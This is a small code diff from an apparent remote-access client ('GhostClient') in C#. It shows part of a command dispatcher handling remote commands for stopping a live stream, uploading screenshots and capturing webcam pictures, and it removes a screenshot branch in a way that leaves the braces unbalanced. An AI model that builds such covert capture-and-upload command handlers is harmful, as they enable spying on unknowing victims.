@@ -935,10 +935,6 @@ namespace GhostClient
                     StopLiveStream();
                     output = "Live stream stopped";
                 }
-                        output = "Screenshot uploaded";
-                    }
-                    else output = "ERROR: Screenshot failed";
-                }
                 else if (upper.StartsWith("!WEBCAMPIC") || upper.StartsWith("WEBCAMPIC"))
                 {
                     output = CaptureWebcam();
